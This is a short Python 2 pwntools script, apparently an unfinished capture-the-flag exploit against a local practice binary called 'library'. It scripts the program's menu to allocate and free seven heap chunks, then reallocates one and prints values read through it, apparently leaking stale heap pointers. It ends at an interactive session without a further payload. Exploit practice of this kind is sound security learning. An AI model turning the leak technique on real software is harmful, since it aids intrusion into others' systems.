from pwn import *
context (log_level="debug")
p = process('./library')
gdb.attach(p)
def add(length):
	p.recvuntil('our option $')
	p.sendline('1')
	p.recvuntil('ax size : ')
	p.sendline(str(length))
	p.recvuntil('ly done.')

def dele(index):
	p.recvuntil('our option $')
	p.sendline('5')
	p.recvuntil('Category ID : ')
	p.sendline(str(index))
	p.recvuntil('ly done!\n')
def addcontent(index,list):
	for l in list:
		p.recvuntil('our option $')
		p.sendline('1')
		p.recvuntil('Category ID : ')
		p.sendline(str(index))
		p.recvuntil('ok ID :')
		p.sendline(l)
def setid(index,content):
	p.recvuntil('our option $')
	p.sendline('2')
	p.recvuntil('Category ID : ')
	p.sendline(str(index))
	p.recvuntil('ok ID :')
	p.sendline(content)
def getid(index,book_index):
	p.recvuntil('our option $')
	p.sendline('3')
	p.recvuntil('Category ID : ')
	p.sendline(str(index))
	p.recvuntil('index : ')
	p.sendline(str(book_index))
	data = p.recvline()[11:-1]
	print hex(int(data))

add(63)#0
add(64)#1
add(64)#2
add(64)#3
add(64)#4
add(64)#5
add(64)#6

dele(6)
dele(5)
dele(4)
dele(3)
dele(2)
dele(1)
dele(0)

add(66)#7
# setid(3,'1234')
getid(7,0)
getid(7,1)
getid(7,2)
getid(7,3)
p.interactive()